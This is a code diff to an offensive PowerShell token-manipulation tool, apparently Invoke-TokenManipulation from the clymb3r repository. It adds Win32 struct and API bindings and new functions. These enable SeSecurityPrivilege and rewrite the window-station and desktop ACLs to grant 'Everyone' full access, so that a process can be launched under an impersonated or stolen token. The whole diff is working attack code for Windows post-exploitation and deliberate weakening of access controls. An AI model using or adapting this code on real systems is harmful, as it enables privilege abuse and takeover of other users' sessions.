@@ -40,7 +40,7 @@ Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
-Version: 0.11
+Version: 0.12
 
 .DESCRIPTION
 
@@ -250,22 +250,43 @@ Github repo: https://github.com/clymb3r/PowerShell
     ###############################
     #Win32Constants
     ###############################
-    $Win32Constants = New-Object PSObject
-    $Win32Constants | Add-Member -Type NoteProperty -Name PROCESS_QUERY_INFORMATION -Value 0x400
-    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_ASSIGN_PRIMARY -Value 0x1
-    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_DUPLICATE -Value 0x2
-    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_IMPERSONATE -Value 0x4
-    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_QUERY -Value 0x8
-    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_QUERY_SOURCE -Value 0x10
-    $Win32Constants | Add-Member -Type NoteProperty -Name STANDARD_RIGHTS_READ -Value 0x20000
-    $Win32Constants | Add-Member -Type NoteProperty -Name STANDARD_RIGHTS_REQUIRED -Value 0xF0000
-    $Win32Constants | Add-Member -Type NoteProperty -Name TokenStatistics -Value 10
-    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_ALL_ACCESS -Value 0xf01ff
-    $Win32Constants | Add-Member -Type NoteProperty -Name MAXIMUM_ALLOWED -Value 0x02000000
-    $Win32Constants | Add-Member -Type NoteProperty -Name THREAD_ALL_ACCESS -Value 0x1f03ff
-    $Win32Constants | Add-Member -Type NoteProperty -Name ERROR_NO_TOKEN -Value 0x3F0
-    $Win32Constants | Add-Member -Type NoteProperty -Name ERROR_INVALID_PARAMETER -Value 0x57
-    $Win32Constants | Add-Member -Type NoteProperty -Name LOGON_NETCREDENTIALS_ONLY -Value 0x2
+    $Constants = @{
+        ACCESS_SYSTEM_SECURITY = 0x01000000
+        READ_CONTROL = 0x00020000
+        SYNCHRONIZE = 0x00100000
+        STANDARD_RIGHTS_ALL = 0x001F0000
+        TOKEN_QUERY = 8
+        TOKEN_ADJUST_PRIVILEGES = 0x20
+        ERROR_NO_TOKEN = 0x3f0
+        SE_PRIVILEGE_ENABLED = 2
+        SECURITY_DELEGATION = 3
+        DACL_SECURITY_INFORMATION = 0x4
+        ACCESS_ALLOWED_ACE_TYPE = 0x0
+        STANDARD_RIGHTS_REQUIRED = 0x000F0000
+        DESKTOP_GENERIC_ALL = 0x000F01FF
+        WRITE_DAC = 0x00040000
+        OBJECT_INHERIT_ACE = 0x1
+        GRANT_ACCESS = 0x1
+        TRUSTEE_IS_NAME = 0x1
+        TRUSTEE_IS_SID = 0x0
+        TRUSTEE_IS_USER = 0x1
+        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
+        TRUSTEE_IS_GROUP = 0x2
+        PROCESS_QUERY_INFORMATION = 0x400
+        TOKEN_ASSIGN_PRIMARY = 0x1
+        TOKEN_DUPLICATE = 0x2
+        TOKEN_IMPERSONATE = 0x4
+        TOKEN_QUERY_SOURCE = 0x10
+        STANDARD_RIGHTS_READ = 0x20000
+        TokenStatistics = 10
+        TOKEN_ALL_ACCESS = 0xf01ff
+        MAXIMUM_ALLOWED = 0x02000000
+        THREAD_ALL_ACCESS = 0x1f03ff
+        ERROR_INVALID_PARAMETER = 0x57
+        LOGON_NETCREDENTIALS_ONLY = 0x2
+    }
+
+    $Win32Constants = New-Object PSObject -Property $Constants
     ###############################
 
 
@@ -332,12 +353,14 @@ Github repo: https://github.com/clymb3r/PowerShell
 	$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
 	$LARGE_INTEGER = $TypeBuilder.CreateType()
 
+    #Struct LUID
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 	$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
 	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
 	$TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
 	$LUID = $TypeBuilder.CreateType()
 
+    #Struct TOKEN_STATISTICS
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_STATISTICS', $Attributes, [System.ValueType])
 	$TypeBuilder.DefineField('TokenId', $LUID, 'Public') | Out-Null
@@ -352,6 +375,7 @@ Github repo: https://github.com/clymb3r/PowerShell
     $TypeBuilder.DefineField('ModifiedId', $LUID, 'Public') | Out-Null
 	$TOKEN_STATISTICS = $TypeBuilder.CreateType()
 
+    #Struct LSA_UNICODE_STRING
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 	$TypeBuilder = $ModuleBuilder.DefineType('LSA_UNICODE_STRING', $Attributes, [System.ValueType])
 	$TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
@@ -359,6 +383,7 @@ Github repo: https://github.com/clymb3r/PowerShell
     $TypeBuilder.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
 	$LSA_UNICODE_STRING = $TypeBuilder.CreateType()
 
+    #Struct LSA_LAST_INTER_LOGON_INFO
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 	$TypeBuilder = $ModuleBuilder.DefineType('LSA_LAST_INTER_LOGON_INFO', $Attributes, [System.ValueType])
 	$TypeBuilder.DefineField('LastSuccessfulLogon', $LARGE_INTEGER, 'Public') | Out-Null
@@ -366,6 +391,7 @@ Github repo: https://github.com/clymb3r/PowerShell
     $TypeBuilder.DefineField('FailedAttemptCountSinceLastSuccessfulLogon', [UInt32], 'Public') | Out-Null
 	$LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()
 
+    #Struct SECURITY_LOGON_SESSION_DATA
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 	$TypeBuilder = $ModuleBuilder.DefineType('SECURITY_LOGON_SESSION_DATA', $Attributes, [System.ValueType])
 	$TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
@@ -393,6 +419,7 @@ Github repo: https://github.com/clymb3r/PowerShell
     $TypeBuilder.DefineField('PasswordMustChange', $LARGE_INTEGER, 'Public') | Out-Null
 	$SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()
 
+    #Struct STARTUPINFO
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
 	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
@@ -415,6 +442,7 @@ Github repo: https://github.com/clymb3r/PowerShell
     $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
 	$STARTUPINFO = $TypeBuilder.CreateType()
 
+    #Struct PROCESS_INFORMATION
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
 	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
@@ -423,10 +451,70 @@ Github repo: https://github.com/clymb3r/PowerShell
     $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
 	$PROCESS_INFORMATION = $TypeBuilder.CreateType()
 
+    #Struct TOKEN_ELEVATION
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_ELEVATION', $Attributes, [System.ValueType])
 	$TypeBuilder.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
 	$TOKEN_ELEVATION = $TypeBuilder.CreateType()
+
+    #Struct LUID_AND_ATTRIBUTES
+    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
+    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
+    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
+    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
+		
+    #Struct TOKEN_PRIVILEGES
+    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
+    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
+    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
+
+    #Struct ACE_HEADER
+    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+    $TypeBuilder = $ModuleBuilder.DefineType('ACE_HEADER', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('AceType', [Byte], 'Public') | Out-Null
+    $TypeBuilder.DefineField('AceFlags', [Byte], 'Public') | Out-Null
+    $TypeBuilder.DefineField('AceSize', [UInt16], 'Public') | Out-Null
+    $ACE_HEADER = $TypeBuilder.CreateType()
+
+    #Struct ACL
+    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+    $TypeBuilder = $ModuleBuilder.DefineType('ACL', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('AclRevision', [Byte], 'Public') | Out-Null
+    $TypeBuilder.DefineField('Sbz1', [Byte], 'Public') | Out-Null
+    $TypeBuilder.DefineField('AclSize', [UInt16], 'Public') | Out-Null
+    $TypeBuilder.DefineField('AceCount', [UInt16], 'Public') | Out-Null
+    $TypeBuilder.DefineField('Sbz2', [UInt16], 'Public') | Out-Null
+    $ACL = $TypeBuilder.CreateType()
+
+    #Struct ACE_HEADER
+    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+    $TypeBuilder = $ModuleBuilder.DefineType('ACCESS_ALLOWED_ACE', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('Header', $ACE_HEADER, 'Public') | Out-Null
+    $TypeBuilder.DefineField('Mask', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('SidStart', [UInt32], 'Public') | Out-Null
+    $ACCESS_ALLOWED_ACE = $TypeBuilder.CreateType()
+
+    #Struct TRUSTEE
+    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+    $TypeBuilder = $ModuleBuilder.DefineType('TRUSTEE', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('pMultipleTrustee', [IntPtr], 'Public') | Out-Null
+    $TypeBuilder.DefineField('MultipleTrusteeOperation', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('TrusteeForm', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('TrusteeType', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('ptstrName', [IntPtr], 'Public') | Out-Null
+    $TRUSTEE = $TypeBuilder.CreateType()
+
+    #Struct EXPLICIT_ACCESS
+    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+    $TypeBuilder = $ModuleBuilder.DefineType('EXPLICIT_ACCESS', $Attributes, [System.ValueType])
+    $TypeBuilder.DefineField('grfAccessPermissions', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('grfAccessMode', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('grfInheritance', [UInt32], 'Public') | Out-Null
+    $TypeBuilder.DefineField('Trustee', $TRUSTEE, 'Public') | Out-Null
+    $EXPLICIT_ACCESS = $TypeBuilder.CreateType()
     ###############################
 
 
@@ -496,7 +584,246 @@ Github repo: https://github.com/clymb3r/PowerShell
     $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
 	$CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
 	$CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)
+
+    $OpenWindowStationWAddr = Get-ProcAddress user32.dll OpenWindowStationW
+    $OpenWindowStationWDelegate = Get-DelegateType @([IntPtr], [Bool], [UInt32]) ([IntPtr])
+    $OpenWindowStationW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenWindowStationWAddr, $OpenWindowStationWDelegate)
+
+    $OpenDesktopAAddr = Get-ProcAddress user32.dll OpenDesktopA
+    $OpenDesktopADelegate = Get-DelegateType @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
+    $OpenDesktopA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenDesktopAAddr, $OpenDesktopADelegate)
+
+    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
+    $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
+    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
+
+    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
+    $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], $LUID.MakeByRefType()) ([Bool])
+    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
+
+    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
+    $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
+    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
+
+    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
+    $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
+    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
+
+    $GetSecurityInfoAddr = Get-ProcAddress advapi32.dll GetSecurityInfo
+    $GetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
+    $GetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetSecurityInfoAddr, $GetSecurityInfoDelegate)
+
+    $SetSecurityInfoAddr = Get-ProcAddress advapi32.dll SetSecurityInfo
+    $SetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
+    $SetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetSecurityInfoAddr, $SetSecurityInfoDelegate)
+
+    $GetAceAddr = Get-ProcAddress advapi32.dll GetAce
+    $GetAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
+    $GetAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAceAddr, $GetAceDelegate)
+
+    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
+    $LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
+    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)
+
+    $AddAccessAllowedAceAddr = Get-ProcAddress advapi32.dll AddAccessAllowedAce
+    $AddAccessAllowedAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
+    $AddAccessAllowedAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddAccessAllowedAceAddr, $AddAccessAllowedAceDelegate)
+
+    $CreateWellKnownSidAddr = Get-ProcAddress advapi32.dll CreateWellKnownSid
+    $CreateWellKnownSidDelegate = Get-DelegateType @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
+    $CreateWellKnownSid = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateWellKnownSidAddr, $CreateWellKnownSidDelegate)
+
+    $SetEntriesInAclWAddr = Get-ProcAddress advapi32.dll SetEntriesInAclW
+    $SetEntriesInAclWDelegate = Get-DelegateType @([UInt32], $EXPLICIT_ACCESS.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
+    $SetEntriesInAclW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetEntriesInAclWAddr, $SetEntriesInAclWDelegate)
+
+    $LocalFreeAddr = Get-ProcAddress kernel32.dll LocalFree
+    $LocalFreeDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
+    $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
     ###############################
+
+
+    #Enable SeSecurityPrivilege, needed to query security information for desktop DACL
+    function Enable-SeSecurityPrivilege
+    {	
+	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
+	    if ($ThreadHandle -eq [IntPtr]::Zero)
+	    {
+		    Throw "Unable to get the handle to the current thread"
+	    }
+		
+	    [IntPtr]$ThreadToken = [IntPtr]::Zero
+	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+	    if ($Result -eq $false)
+	    {
+		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
+		    {
+			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
+			    if ($Result -eq $false)
+			    {
+				    Throw (New-Object ComponentModel.Win32Exception)
+			    }
+				
+			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+			    if ($Result -eq $false)
+			    {
+				    Throw (New-Object ComponentModel.Win32Exception)
+			    }
+		    }
+		    else
+		    {
+			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
+		    }
+	    }
+
+        $CloseHandle.Invoke($ThreadHandle) | Out-Null
+	
+        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
+        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
+        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
+
+	    $Result = $LookupPrivilegeValue.Invoke($null, "SeSecurityPrivilege", [Ref] $LuidObject)
+
+	    if ($Result -eq $false)
+	    {
+		    Throw (New-Object ComponentModel.Win32Exception)
+	    }
+
+        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
+        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
+        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)
+
+        $LuidAndAttributes.Luid = $LuidObject
+        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
+
+        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
+        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
+        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
+	    $TokenPrivileges.PrivilegeCount = 1
+	    $TokenPrivileges.Privileges = $LuidAndAttributes
+
+        $Global:TokenPriv = $TokenPrivileges
+
+	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
+	    if ($Result -eq $false)
+	    {
+            Throw (New-Object ComponentModel.Win32Exception)
+	    }
+
+        $CloseHandle.Invoke($ThreadToken) | Out-Null
+    }
+
+
+    function Set-DesktopACLs
+    {
+        Enable-SeSecurityPrivilege
+
+        #Change the privilege for the current window station to allow full privilege for all users
+        $WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("WinSta0")
+        $hWinsta = $OpenWindowStationW.Invoke($WindowStationStr, $false, $Win32Constants.ACCESS_SYSTEM_SECURITY -bor $Win32Constants.READ_CONTROL -bor $Win32Constants.WRITE_DAC)
+
+        if ($hWinsta -eq [IntPtr]::Zero)
+        {
+            Throw (New-Object ComponentModel.Win32Exception)
+        }
+
+        Set-DesktopACLToAllowEveryone -hObject $hWinsta
+        $CloseHandle.Invoke($hWinsta) | Out-Null
+
+        #Change the privilege for the current desktop to allow full privilege for all users
+        $hDesktop = $OpenDesktopA.Invoke("default", 0, $false, $Win32Constants.DESKTOP_GENERIC_ALL -bor $Win32Constants.WRITE_DAC)
+        if ($hDesktop -eq [IntPtr]::Zero)
+        {
+            Throw (New-Object ComponentModel.Win32Exception)
+        }
+
+        Set-DesktopACLToAllowEveryone -hObject $hDesktop
+        $CloseHandle.Invoke($hDesktop) | Out-Null
+    }
+
+
+    function Set-DesktopACLToAllowEveryone
+    {
+        Param(
+            [IntPtr]$hObject
+            )
+
+        [IntPtr]$ppSidOwner = [IntPtr]::Zero
+        [IntPtr]$ppsidGroup = [IntPtr]::Zero
+        [IntPtr]$ppDacl = [IntPtr]::Zero
+        [IntPtr]$ppSacl = [IntPtr]::Zero
+        [IntPtr]$ppSecurityDescriptor = [IntPtr]::Zero
+        #0x7 is window station, change for other types
+        $retVal = $GetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
+        if ($retVal -ne 0)
+        {
+            Write-Error "Unable to call GetSecurityInfo. ErrorCode: $retVal"
+        }
+
+        if ($ppDacl -ne [IntPtr]::Zero)
+        {
+            $AclObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ppDacl, [Type]$ACL)
+
+            #Add all users to acl
+            [UInt32]$RealSize = 2000
+            $pAllUsersSid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RealSize)
+            $Success = $CreateWellKnownSid.Invoke(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
+            if (-not $Success)
+            {
+                Throw (New-Object ComponentModel.Win32Exception)
+            }
+
+            #For user "Everyone"
+            $TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf($TRUSTEE)
+            $TrusteePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TrusteeSize)
+            $TrusteeObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TrusteePtr, [Type]$TRUSTEE)
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrusteePtr)
+            $TrusteeObj.pMultipleTrustee = [IntPtr]::Zero
+            $TrusteeObj.MultipleTrusteeOperation = 0
+            $TrusteeObj.TrusteeForm = $Win32Constants.TRUSTEE_IS_SID
+            $TrusteeObj.TrusteeType = $Win32Constants.TRUSTEE_IS_WELL_KNOWN_GROUP
+            $TrusteeObj.ptstrName = $pAllUsersSid
+
+            #Give full permission
+            $ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf($EXPLICIT_ACCESS)
+            $ExplicitAccessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ExplicitAccessSize)
+            $ExplicitAccess = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExplicitAccessPtr, [Type]$EXPLICIT_ACCESS)
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ExplicitAccessPtr)
+            $ExplicitAccess.grfAccessPermissions = 0xf03ff
+            $ExplicitAccess.grfAccessMode = $Win32constants.GRANT_ACCESS
+            $ExplicitAccess.grfInheritance = $Win32Constants.OBJECT_INHERIT_ACE
+            $ExplicitAccess.Trustee = $TrusteeObj
+
+            [IntPtr]$NewDacl = [IntPtr]::Zero
+
+            $RetVal = $SetEntriesInAclW.Invoke(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
+            if ($RetVal -ne 0)
+            {
+                Write-Error "Error calling SetEntriesInAclW: $RetVal"
+            }
+
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAllUsersSid)
+
+            if ($NewDacl -eq [IntPtr]::Zero)
+            {
+                throw "New DACL is null"
+            }
+
+            #0x7 is window station, change for other types
+            $RetVal = $SetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
+            if ($RetVal -ne 0)
+            {
+                Write-Error "SetSecurityInfo failed. Return value: $RetVal"
+            }
+
+            $LocalFree.Invoke($ppSecurityDescriptor) | Out-Null
+        }
+    }
 
 
     function Get-PrimaryToken
@@ -1133,7 +1460,7 @@ Github repo: https://github.com/clymb3r/PowerShell
             #Use the token for the selected action
             if ($CreateProcess)
             {
-                Invoke-RevertToSelf # todo maybe delete
+                Set-DesktopACLs
                 Create-ProcessWithToken -hToken $hToken -ProcessName $ProcessName -ProcessArgs $ProcessArgs
 
                 if ($OriginalUser -ine "SYSTEM")
